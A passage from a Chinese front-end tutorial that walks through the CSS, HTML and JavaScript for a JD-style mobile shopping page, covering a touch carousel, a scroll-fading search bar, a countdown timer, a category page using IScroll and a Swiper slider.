    background: #fff;
    border-radius: 15px;
    padding-left: 40px;
}
/*轮播图*/
.jd_banner{
    width: 100%;
    overflow: hidden;
    position: relative;
}
.jd_banner ul:first-child{
    width: 1000%;
    transform: translateX(-10%);
    -webkit-transform: translateX(-10%);
}
.jd_banner ul:first-child li{
    width: 10%;
    float: left;
}
.jd_banner ul:first-child li a{
    display: block;
    width: 100%;
}
.jd_banner ul:first-child li a img{
    display: block;
    width: 100%;
}
.jd_banner ul:last-child{
    position: absolute;
    width: 118px;
    height: 6px;
    left: 50%;
    margin-left:-59px;
    bottom: 6px;
}
.jd_banner ul:last-child li{
    width: 6px;
    height: 6px;
    border-radius: 3px;
    border: 1px solid #fff;
    margin-left:10px;
    float: left;
}
.jd_banner ul:last-child li:first-child{
    margin-left:0;
}
.jd_banner ul:last-child li.now{
    background: #fff;
}
/*导航栏*/
.jd_nav{
    width: 100%;
    background: #fff;
    border-bottom: 1px solid #ccc;
}
.jd_nav ul{
    width: 100%;
    padding-top: 10px;
    padding-bottom: 10px;
}
.jd_nav ul li{
    width: 25%;
    float: left;
}
.jd_nav ul li a{
    display: block;
    width: 100%;
}
.jd_nav ul li a img{
    display: block;
    width: 40px;
    height: 40px;
    margin: 0 auto;
}
.jd_nav ul li a p{
    text-align: center;
    font-size: 12px;
    color: #666;
    padding: 5px 0;
}
/*产品区块*/
.jd_product{
    padding: 0 5px;
}
/*产品盒子*/
.jd_product_box{
    margin-top: 10px;
    box-shadow: 0 0 2px #ccc;
    background: #fff;
}
.jd_product_box .tit{
    height: 34px;
    line-height: 34px;
    border-bottom: 1px solid #ddd;
}
.jd_product_box .tit.nb{
    border-bottom: none;
}
.jd_product_box .tit h3{
    font-weight: normal;
    position: relative;
    padding-left:23px;
}
.jd_product_box .tit h3::before{
    content: "";
    width: 3px;
    height: 12px;
    background: #d8505c;
    position: absolute;
    left: 10px;
    top: 11px;
}

/*秒杀*/
.sk .icon{
        width: 16px;
        height: 20px;
        float: left;
        margin-left:10px;
        margin-top:7px;
        background: url("../images/seckill-icon.png") no-repeat center/16px 20px;
}
.sk .name{
    float: left;
    margin-left:10px;
    font-size: 16px;
    color: #d8505c;
}
.sk .time{
    float: left;
    margin-left:10px;
}
.sk .time span{
    float: left;
    width: 16px;
    height: 16px;
    line-height: 16px;
    text-align: center;
    color: #fff;
    background: #333;
    margin-left: 3px;
    margin-top:9px;
}
.sk .time span:nth-child(3n){
    background: #fff;
    width: 3px;
    color: #333;
}
.sk .pro{
    width: 100%;
    padding: 10px 0;
}
.sk .pro li{
    width: 33.3333%;
    float: left;
}
.sk .pro li a{
    display: block;
    border-right: 1px solid #ddd;
}
.sk .pro li:last-child a{
    border-right:none;
}
.sk .pro li a img{
    display: block;
    margin: 0 auto;
    width: 64%;
}
.sk .pro li p{
    text-align: center;
    font-size: 12px;
    padding: 5px 0;
}
.sk .pro li .nowPrice{
    color: #d8505c;
}
.sk .pro li .oldPrice{
    color: #666;
    text-decoration: line-through;
}

/*组合样式的使用*/
.w_50p{
    width: 50%;
}
.w_50p img{
    display: block;
    width: 100%;
}
.bl{
    border-left:1px solid #ddd;
}
.br{
    border-right:1px solid #ddd;
}
.bb{
    border-bottom:1px solid #ddd;
}
```
>[danger] ##### base.css
```
/*=======reset css========*/
*,
*::before,
*::after{
    /*所有的标签，和伪元素都选中*/
    margin: 0;
    padding: 0;
    /*移动端常用布局是非固定像素*/
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    /*点击高亮效果的清除*/
    tap-highlight-color: transparent;
    -webkit-tap-highlight-color: transparent;
}
body{
    font-size: 14px;
    font-family: "Microsoft YaHei",sans-serif;
    color: #333;
}
ul,ol{
    list-style: none;
}
a{
    text-decoration: none;
    color: #333;
}
input,textarea{
    border: none;
    outline: none;
    /*不允许改变textarea尺寸*/
    resize: none;
    /*元素的外观  none没有任何样式*/
    -webkit-appearance: none;
}
/*=======common css========*/
.f_left{
    float: left;
}
.f_right{
    float: right;
}
.clearFix::before,
.clearFix::after{
    content: "";
    display: block;
    visibility: hidden;
    height: 0;
    line-height: 0;
    clear: both;
}
.m_l10{
    margin-left:10px;
}
.m_r10{
    margin-right:10px;
}
.m_t10{
    margin-top:10px;
}
.m_b10{
    margin-bottom:10px;
}
/*使用精灵图的公用样式*/
[class^="icon_"],[class*=" icon_"]{
    background-repeat: no-repeat;
    background-image: url("../images/sprites.png");
    background-size: 200px 200px;
}
```
>[success] # 效果 js 代码
```
1.滚动屏幕导航栏从透明变成有颜色
```
```
window.onload = function () {
    /*1.顶部搜索*/
    search();
    /*2.轮播图*/
    banner();
    /*3.倒计时*/
    downTime();
};
```
>[danger] #####     search() 搜索栏透明度的变化
![](https://box.kancloud.cn/41d383fc969b08b4ff3c66889930c869_365x163.png)
![](https://box.kancloud.cn/ef73ab6aca60f19ac466e194ffeafd65_346x204.png)
```
1.先获取 搜索框元素 后续更改颜色
2.在获取 滚动高度 进行事件监听判断
```
```js
var search = function () {
    /*1.默认固定顶部透明背景*/
    var searchBox = document.querySelector('.jd_search_box');
    var banner = document.querySelector('.jd_banner');
    var height = banner.offsetHeight;
    /*监听页面滚动事件*/
    window.onscroll = function () {
        // 三种浏览的兼容写法，其中只要考虑website 的兼容就可以
        /*console.log(document.body.scrollTop);
         console.log(document.documentElement.scrollTop);
         console.log(window.pageYOffset);*/
        var scrollTop = document.documentElement.scrollTop;
        console.log();
        /*默认的透明度*/
        var opacity = 0;
        if (scrollTop < height) {
            /*2.当页面滚动的时候---随着页面卷曲的高度变大透明度变大*/
            opacity = scrollTop / height * 0.85;
        } else {
            /*3.当页面滚动的时候---超过某一个高度的时候透明度不变*/
            opacity = 0.85;
        }
        searchBox.style.background = 'rgba(201,21,35,' + opacity + ')';
    }
};
```
>[danger] ##### 轮播图
* 轮播图效果
```
1.ele.addEventListener('transitionend', function () {}),transitionend监听过渡效果的触发，当过渡效果触发的时候触发这个事件
2.主要改变translateX 的距离配合定时器形成轮播图效果
```
```
/*轮播图*/
    var banner = document.querySelector('.jd_banner');
    /*屏幕宽度*/
    var width = banner.offsetWidth;
    /*图片容器*/
    var imageBox = banner.querySelector('ul:first-child');
    /*点容器*/
    var pointBox = banner.querySelector('ul:last-child');
    /*所有的点*/
    var points = pointBox.querySelectorAll('li');

    var addTransition = function () {
        imageBox.style.transition = 'all 0.2s';
        imageBox.style.webkitTransition = 'all 0.2s';
    }
    var removeTransition = function () {
        imageBox.style.transition = 'none';
        imageBox.style.webkitTransition = 'none';
    }
    var setTranslateX = function (translateX) {
        imageBox.style.transform = 'translateX(' + translateX + 'px)';
        imageBox.style.webkitTransform = 'translateX(' + translateX + 'px)';
    }


    /*程序的核心 index */
    var index = 1;
    var timer = setInterval(function () {
        index++;
        /*加过渡*/
        addTransition();
        /*做位移*/
        setTranslateX(-index * width);
    }, 1000);
    /*需要等最后一张动画结束去判断 是否瞬间定位第一张，动画过渡效果时候触发事件*/
    imageBox.addEventListener('transitionend', function () {
        /*自动滚动的无缝*/
        if (index >= 9) {
            index = 1;
            /*瞬间定位*/
            /*清过渡*/
            removeTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }
        /*滑动的时候也需要无缝*/
        else if (index <= 0) {
            index = 8;
            /*瞬间定位*/
            /*清过渡*/
            removeTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }
        /*根据索引设置点*/
        /*此时此刻  index  的取值范围  1-8（0,8--1,9）*/
        /*点索引  index - 1 */
        setPoint();
    });

    /*设置点的方法*/
    var setPoint = function () {
        /*index 1-8*/
        /*清除样式*/
        for (var i = 0; i < points.length; i++) {
            var obj = points[i];
            obj.classList.remove('now');
        }
        /*给对应的加上样式*/
        points[index - 1].classList.add('now');
    }

```
* 配合滑动效果分析
```
1.要分别获取，触碰屏幕时候的坐标，移动屏幕时候坐标，和离开屏幕的时候坐标
2.当触摸屏幕的时候，停掉定时器，当移动的时候，应该更改ul的距离，注意ul要清除浮动，否则高度为0
3.isMove 的判断只是为了增加代码的可读性，当只有触发移动的事件才可以，有后续的操作
4.当移动的距离小于三分之一，就轮播移动会之前的位置，也就是之前的inde位置
5.移动完成后重新赋值定时器
```
```
 /*绑定事件*/
    var startX = 0;
    var distanceX = 0;
    var isMove = false;
    imageBox.addEventListener('touchstart', function (e) {
        /*清除定时器*/
        clearInterval(timer);
        /*记录起始位置的X坐标,获取触碰点数组中的第一个触碰点*/
        startX = e.touches[0].clientX;
    });
    imageBox.addEventListener('touchmove', function (e) {
        /*记录滑动过程当中的X坐标*/
        var moveX = e.touches[0].clientX;
        /*计算位移  有正负方向,如果向左为负移动，向右正移动*/
        distanceX = moveX - startX;
        /*计算目标元素的位移  不用管正负*/
        /*元素将要的定位=当前定位图片宽度+手指移动的距离*/
        var translateX = -index * width + distanceX;
        /*滑动--->元素随着手指的滑动做位置的改变*/
        removeTransition();
        setTranslateX(translateX);
        isMove = true;
    });
    imageBox.addEventListener('touchend', function (e) {
        /*4.  5.  实现*/
        /*要使用移动的距离*/
        if (isMove) {
            if (Math.abs(distanceX) < width / 3) {
                /*吸附如果没有超过三分之一就回到当前index图片*/
                addTransition();
                setTranslateX(-index * width);
            } else {
                /*切换*/
                /*右滑动 上一张*/
                if (distanceX > 0) {
                    index--;
                }
                /*左滑动 下一张*/
                else {
                    index++;
                }
                /*根据index去动画的移动*/
                addTransition();
                setTranslateX(-index * width);
            }
        }
        /*最好做一次参数的重置*/
        startX = 0;
        distanceX = 0;
        isMove = false;
        /*加上定时器*/
        clearInterval(timer);
        timer = setInterval(function () {
            index++;
            /*加过渡*/
            addTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }, 1000);
    });
```
>[danger] ##### 倒计时效果
```
var downTime = function () {
    /*1.每一秒改变当前的时间*/
    /*2.倒数计时  假设 4小时*/
    var time = 4 * 60 * 60;
    var spans = document.querySelectorAll('.time span');

    var timer = setInterval(function () {
        time --;
        /*格式化  给不同的元素html内容*/
        var h = Math.floor(time/3600);
        var m = Math.floor(time%3600/60);
        var s = Math.floor(time%60);

		// 小时的显示 是两位数 也就是 例如要展示12 12/10 十位数向下取整是1，余数百分之10是他的个位数
        spans[0].innerHTML = Math.floor(h/10);
        spans[1].innerHTML = h%10;
        spans[3].innerHTML = Math.floor(m/10);
        spans[4].innerHTML = m%10;
        spans[6].innerHTML = Math.floor(s/10);
        spans[7].innerHTML = s%10;

        if(time <= 0){
            clearInterval(timer);
        }

    }, 1000)
```
>[danger] ##### 完整js代码
```
window.onload = function () {
    /*1.顶部搜索*/
    search();
    /*2.轮播图*/
    banner();
    /*3.倒计时*/
    downTime();
};
var search = function () {
    /*1.默认固定顶部透明背景*/
    var searchBox = document.querySelector('.jd_search_box');
    var banner = document.querySelector('.jd_banner');
    var height = banner.offsetHeight;
    /*监听页面滚动事件*/
    window.onscroll = function () {
        /*console.log(document.body.scrollTop);
         console.log(document.documentElement.scrollTop);
         console.log(window.pageYOffset);*/
        var scrollTop = document.body.scrollTop;
        //console.log(scrollTop);
        /*默认的透明度*/
        var opacity = 0;
        if (scrollTop < height) {
            /*2.当页面滚动的时候---随着页面卷曲的高度变大透明度变大*/
            opacity = scrollTop / height * 0.85;
        } else {
            /*3.当页面滚动的时候---超过某一个高度的时候透明度不变*/
            opacity = 0.85;
        }
        searchBox.style.background = 'rgba(201,21,35,' + opacity + ')';
    }
};
var banner = function () {
    /*1. 自动轮播图且无缝   定时器，过渡*/
    /*2. 点要随着图片的轮播改变  根据索引切换*/
    /*3. 滑动效果  利用touch事件完成*/
    /*4. 滑动结束的时候    如果滑动的距离不超过屏幕的1/3  吸附回去   过渡*/
    /*5. 滑动结束的时候    如果滑动的距离超过屏幕的1/3  切换（上一张，下一张）根据滑动的方向，过渡*/

    /*轮播图*/
    var banner = document.querySelector('.jd_banner');
    /*屏幕宽度*/
    var width = banner.offsetWidth;
    /*图片容器*/
    var imageBox = banner.querySelector('ul:first-child');
    /*点容器*/
    var pointBox = banner.querySelector('ul:last-child');
    /*所有的点*/
    var points = pointBox.querySelectorAll('li');

    var addTransition = function () {
        imageBox.style.transition = 'all 0.2s';
        imageBox.style.webkitTransition = 'all 0.2s';
    }
    var removeTransition = function () {
        imageBox.style.transition = 'none';
        imageBox.style.webkitTransition = 'none';
    }
    var setTranslateX = function (translateX) {
        imageBox.style.transform = 'translateX(' + translateX + 'px)';
        imageBox.style.webkitTransform = 'translateX(' + translateX + 'px)';
    }


    /*程序的核心 index */
    var index = 1;
    var timer = setInterval(function () {
        index++;
        /*加过渡*/
        addTransition();
        /*做位移*/
        setTranslateX(-index * width);
    }, 1000);
    /*需要等最后一张动画结束去判断 是否瞬间定位第一张*/
    imageBox.addEventListener('transitionend', function () {
        /*自动滚动的无缝*/
        if (index >= 9) {
            index = 1;
            /*瞬间定位*/
            /*清过渡*/
            removeTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }
        /*滑动的时候也需要无缝*/
        else if (index <= 0) {
            index = 8;
            /*瞬间定位*/
            /*清过渡*/
            removeTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }
        /*根据索引设置点*/
        /*此时此刻  index  的取值范围  1-8（0,8--1,9）*/
        /*点索引  index - 1 */
        setPoint();
    });

    /*设置点的方法*/
    var setPoint = function () {
        /*index 1-8*/
        /*清除样式*/
        for (var i = 0; i < points.length; i++) {
            var obj = points[i];
            obj.classList.remove('now');
        }
        /*给对应的加上样式*/
        points[index - 1].classList.add('now');
    }

    /*绑定事件*/
    var startX = 0;
    var distanceX = 0;
    var isMove = false;
    imageBox.addEventListener('touchstart', function (e) {
        /*清除定时器*/
        clearInterval(timer);
        /*记录起始位置的X坐标*/
        startX = e.touches[0].clientX;
    });
    imageBox.addEventListener('touchmove', function (e) {
        /*记录滑动过程当中的X坐标*/
        var moveX = e.touches[0].clientX;
        /*计算位移  有正负方向*/
        distanceX = moveX - startX;
        /*计算目标元素的位移  不用管正负*/
        /*元素将要的定位=当前定位+手指移动的距离*/
        var translateX = -index * width + distanceX;
        /*滑动--->元素随着手指的滑动做位置的改变*/
        removeTransition();
        setTranslateX(translateX);
        isMove = true;
    });
    imageBox.addEventListener('touchend', function (e) {
        /*4.  5.  实现*/
        /*要使用移动的距离*/
        if (isMove) {
            if (Math.abs(distanceX) < width / 3) {
                /*吸附*/
                addTransition();
                setTranslateX(-index * width);
            } else {
                /*切换*/
                /*右滑动 上一张*/
                if (distanceX > 0) {
                    index--;
                }
                /*左滑动 下一张*/
                else {
                    index++;
                }
                /*根据index去动画的移动*/
                addTransition();
                setTranslateX(-index * width);
            }
        }
        /*最好做一次参数的重置*/
        startX = 0;
        distanceX = 0;
        isMove = false;
        /*加上定时器*/
        clearInterval(timer);
        timer = setInterval(function () {
            index++;
            /*加过渡*/
            addTransition();
            /*做位移*/
            setTranslateX(-index * width);
        }, 1000);
    });


}
var downTime = function () {
    /*1.每一秒改变当前的时间*/
    /*2.倒数计时  假设 4小时*/
    var time = 4 * 60 * 60;
    var spans = document.querySelectorAll('.time span');

    var timer = setInterval(function () {
        time --;
        /*格式化  给不同的元素html内容*/
        var h = Math.floor(time/3600);
        var m = Math.floor(time%3600/60);
        var s = Math.floor(time%60);

        spans[0].innerHTML = Math.floor(h/10);
        spans[1].innerHTML = h%10;
        spans[3].innerHTML = Math.floor(m/10);
        spans[4].innerHTML = m%10;
        spans[6].innerHTML = Math.floor(s/10);
        spans[7].innerHTML = s%10;

        if(time <= 0){
            clearInterval(timer);
        }

    }, 1000)

}
```
[TOC]
>[success] # 购物页面案例
```
1.和京东案例通用一套base.css
```
>[danger] ##### 头部案例
![](https://box.kancloud.cn/d402f90bb1f3ad37440c380e5c0bba88_412x127.png)

```html
<div class="jd_layout">
    <!--头部样式-->
    <header class="jd_topBar">
        <a href="#" class="icon_back"></a>
        <form action="#"><input type="search" placeholder="顶部通栏"></form>
        <a href="#" class="icon_menu"></a>
    </header>
</div>
```

* css 设置宽高定位在做其他效果
```
1.设置 html和body的高度否则内部元素没有高度显示效果
```
```css
html,body{
    height: 100%;
}
.jd_layout{
    width: 100%;
    height: 100%;
}

.jd_layout .jd_topBar{
    width: 100%;
    height: 45px;
    border-bottom: 1px solid #cccccc;
    background: url("../images/header-bg.png") 0 0 / 1px 44px;
    position:absolute;
    top: 0;
    left: 0;
    
}

.jd_topBar a{
    width:40px;
    height: 44px;
    padding: 12px 10px;
    position: absolute;
    top: 0;
    background-origin: content-box;
    background-clip: content-box;
}
.jd_topBar .icon_back{
    left: 0;
    background-position: -20px 0;
}
.jd_topBar .icon_menu{
    right: 0;
    background-position: -60px 0;
}

.jd_topBar form{
    width: 100%;
    padding: 0 40px;
}
.jd_topBar form input{
    width: 100%;
    height: 30px;
    border: 1px solid #ddd;
    border-radius: 4px;
    margin-top: 7px;
    padding: 0 10px;
}
```
>[danger] ##### 中心内容分析
![](https://box.kancloud.cn/17ec1bbc4ff5875992469da983213422_633x802.png)
```
1. 红色区域内边距加显示区域一共占比100%，这样如果不让sreach 脱离文档流，就会形成一个滚动条
2.所以要设置sreach 区域的脱离文档流
```
* css
```
.jd_main{
    width: 100%;
    height: 100%;
    padding-top: 45px;
}

.jd_cateLeft{
    float: left;
    width: 70px;
    height: 100%;
    background: #00AA88;
}

.jd_cateRight{
    height: 100%;
}
```
* html
```
    <div class="jd_layout">
        <!--头部样式-->
        <header class="jd_topBar">
            <a href="#" class="icon_back"></a>
            <form action="#"><input type="search" placeholder="顶部通栏"></form>
            <a href="#" class="icon_menu"></a>
        </header>

        <!--主体-->
        <div class="jd_main">
            <div class="jd_cateLeft">

            </div>
            <div class="jd_cateRight">
                内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容
                内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容

            </div>
        </div>
    </div>
```
>[success] # 全部完整的代码
![](https://box.kancloud.cn/09098e563d6f210923df66dc4761ab77_391x697.png)
>[danger] ##### css
```
html,body{
    height: 100%;
}
.jd_layout{
    width: 100%;
    height: 100%;
}
/*顶部通栏*/
.jd_topBar{
    width: 100%;
    height: 45px;
    border-bottom: 1px solid #ccc;
    background: url("../images/header-bg.png") 0 0 / 1px 44px;
    position: absolute;
    left: 0;
    top: 0;
    z-index: 1;
}
.jd_topBar a{
    width: 40px;
    height: 44px;
    padding: 12px 10px;
    position: absolute;
    top: 0;
    /*让背景从内容开始平铺*/
    background-origin: content-box;
    /*没有做背景裁剪 背景图默认就是从边框显示*/
    /*默认的就是
    border-box  边框以外被裁剪掉
    padding-box 内边距以外被裁剪掉
    content-box 内容以外被裁剪掉
    */
    background-clip: content-box;
}
.jd_topBar .icon_back{
    left: 0;
    background-position: -20px 0;
}
.jd_topBar .icon_menu{
    right: 0;
    background-position: -60px 0;
}
.jd_topBar form{
    width: 100%;
    padding: 0 40px;
}
.jd_topBar form input{
    width: 100%;
    height: 30px;
    border: 1px solid #ddd;
    border-radius: 4px;
    margin-top: 7px;
    padding: 0 10px;
}
/*占满剩余的高度*/
.jd_main{
    width: 100%;
    height: 100%;
    padding-top: 45px;
}
.jd_main .jd_cateLeft{
    width: 90px;
    height: 100%;
    float: left;
    overflow: hidden;
}
.jd_cateLeft ul{
    width: 90px;
}
.jd_cateLeft ul li{
    width: 90px;
    height: 50px;
    line-height: 50px;
    background: #f3f4f5;
    text-align: center;
    font-size: 12px;
    border-bottom: 1px solid #ccc;
    border-right: 1px solid #ccc;
}
.jd_cateLeft ul li.now{
    border-right: none;
    background: #fff;
}
.jd_cateLeft ul li a{
    display: block;
    width: 100%;
}
.jd_cateLeft ul li.now a{
    color: #d8505c;
}

.jd_main .jd_cateRight{
    overflow: hidden;
    height: 100%;
}
.jd_cateRight_box{
    width: 101%;
    padding: 0 10px;
}
.jd_cateRight_box .banner{
    width: 100%;
    display: block;
    margin-top: 10px;
}
.jd_cateRight_box .banner img{
    width: 100%;
    display: block;
}
.jd_cateRight_box .hot{
    margin-top: 10px;
}
.jd_cateRight_box .hot h3{
    font-size: 12px;
}
.jd_cateRight_box .hot ul{
    width: 100%;
}
.jd_cateRight_box .hot ul li{
    width: 33.3333%;
    float: left;
    padding-top: 5px;
}
.jd_cateRight_box .hot ul li a{
    display: block;
    width: 100%;
}
.jd_cateRight_box .hot ul li a img{
    width: 62px;
    height: 62px;
    display: block;
    margin: 0 auto;
}
.jd_cateRight_box .hot ul li a p{
    font-size: 12px;
    text-align: center;
    padding: 5px 0;
}

```

>[danger] ##### html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>京东移动站-分类</title>
    <link rel="stylesheet" href="css/base.css">
    <link rel="stylesheet" href="css/category.css">
</head>
<body>
<!--全屏容器-->
<div class="jd_layout">
    <!--顶部通栏-->
    <header class="jd_topBar">
        <a href="#" class="icon_back"></a>
        <form action="#"><input type="search" placeholder="顶部通栏"></form>
        <a href="#" class="icon_menu"></a>
    </header>
    <!--分类主体-->
    <div class="jd_main">
        <div class="jd_cateLeft">
            <ul>
                <li class=""><a href="javascript:;">热门推荐</a></li>
                <li class="now"><a href="javascript:;">潮流女装</a></li>
                <li class=""><a href="javascript:;">品牌男装</a></li>
                <li class=""><a href="javascript:;">内衣配饰</a></li>
                <li class=""><a href="javascript:;">家用电器</a></li>
                <li class=""><a href="javascript:;">电脑办公</a></li>
                <li class=""><a href="javascript:;">手机数码</a></li>
                <li class=""><a href="javascript:;">母婴频道</a></li>
                <li class=""><a href="javascript:;">图书</a></li>
                <li class=""><a href="javascript:;">家居家纺</a></li>
                <li class=""><a href="javascript:;">居家生活</a></li>
                <li class=""><a href="javascript:;">家具建材</a></li>
                <li class=""><a href="javascript:;">热门推荐</a></li>
                <li class=""><a href="javascript:;">潮流女装</a></li>
                <li class=""><a href="javascript:;">品牌男装</a></li>
                <li class=""><a href="javascript:;">内衣配饰</a></li>
                <li class=""><a href="javascript:;">家用电器</a></li>
                <li class=""><a href="javascript:;">电脑办公</a></li>
                <li class=""><a href="javascript:;">手机数码</a></li>
                <li class=""><a href="javascript:;">母婴频道</a></li>
                <li class=""><a href="javascript:;">图书</a></li>
                <li class=""><a href="javascript:;">家居家纺</a></li>
                <li class=""><a href="javascript:;">居家生活</a></li>
                <li class=""><a href="javascript:;">家具建材</a></li>
            </ul>
        </div>
        <div class="jd_cateRight">
            <div class="jd_cateRight_box">
                <a class="banner" href="#"><img src="images/banner_1.jpg" alt=""></a>
                <div class="hot">
                    <h3>热门分类</h3>
                    <ul class="clearFix">
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                    </ul>
                </div>
                <div class="hot">
                    <h3>热门分类</h3>
                    <ul class="clearFix">
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                        <li><a href="#"><img src="images/nv-fy.jpg" alt=""><p>毛呢大衣</p></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<script src="js/common.js"></script>
<script src="js/iscroll.js"></script>
<script src="js/category.js"></script>
</body>
</html>
```
>[danger] ##### 使用方法
```
1.对外面容器的操作，浮动后对父容器清掉浮动
```
```
  /*区域滚动效果*/
    /*条件：一个容器装着一个容器html结构*/
    /*找到大容器*/
    /*子容器大于父容器*/
    new IScroll(document.querySelector('.jd_cateLeft'),{
        scrollX:false,
        scrollY:true
    });
    new IScroll(document.querySelector('.jd_cateRight'),{
        scrollX:true,
        scrollY:false
    });
```
>[danger] ##### 插件 swiper使用官网查看
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>Title</title>
    <link rel="stylesheet" href="lib/swiper/css/swiper.min.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/less" href="less/index-swiper.less">
    <script src="lib/less/less.min.js"></script>
</head>
<body>
<!--版心-->
<div class="sn_container">
    <!--顶部通栏-->
    <header class="sn_topBar">
        <a href="#" class="icon_category"></a>
        <form action="#">
            <span class="icon_search"></span>
            <input type="search" placeholder="60寸电视免费拿">
        </form>
        <a href="#" class="icon_cart"></a>
    </header>
    <!--轮播图-->
    <style>
        .swiper-container img{
            width: 100%;
            display: block;
        }
    </style>
    <div class="swiper-container">
        <ul class="swiper-wrapper">
            <li class="swiper-slide"><a href="#"><img src="images/banner01.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner02.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner03.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner04.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner05.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner06.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner07.jpg" alt=""></a></li>
            <li class="swiper-slide"><a href="#"><img src="images/banner08.jpg" alt=""></a></li>
        </ul>
        <ul class="swiper-pagination">

        </ul>
    </div>
    <!--分类-->
    <nav class="sn_nav">
        <ul class="clearFix">
            <li><a href="#"><img src="images/nav01.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav02.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav03.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav04.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav05.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav01.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav02.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav03.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav04.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav05.png" alt=""><p>分类</p></a></li>
        </ul>
    </nav>
    <!--页签-->
    <footer class="sn_tabs">
        <ul>
            <li><a href="#"><span class="fa fa-home"></span><p>首页</p></a></li>
            <li><a href="#"><span class="fa fa-reorder"></span><p>分类</p></a></li>
            <li><a href="#"><span class="fa fa-file-text-o"></span><p>必抢清单</p></a></li>
            <li><a href="#"><span class="fa fa-user"></span><p>我的易购</p></a></li>
            <li><a href="#"><span class="fa fa-suitcase"></span><p>新手大礼包</p></a></li>
        </ul>
    </footer>
</div>
<script src="lib/zepto/zepto.min.js"></script>
<script src="lib/swiper/js/swiper.jquery.min.js"></script>
<script>
    $(function () {
        /*
        * 1.自动轮播
        * 2.无缝循环
        * 3.指示功能
        * */
        new Swiper('.swiper-container',{
            autoplay:1000,
            loop:true,
            pagination:'.swiper-pagination',
            autoplayDisableOnInteraction:false
        });
    })
</script>
</body>
</html>
```
[什么是css](什么是css.md)
[常用属性](常用属性.md)
[字体选属性](字体选属性.md)
[样式书写三种方式](样式书写三种方式.md)
[选择器](选择器.md)
[css三大特性/权重](css三大特性.md)
[块级元素/内行/内行块](块级元素-内行-内行块.md)
[a标签的5个方式](a标签的5个方式.md)
[背景属性](背景属性.md)
[文字行高](文字行高.md)
[盒子模型](盒子模型.md)
[浮动布局](浮动布局.md)
[清除浮动](清除浮动.md)
[同行常用的开头清除](同行常用的开头清除.md)
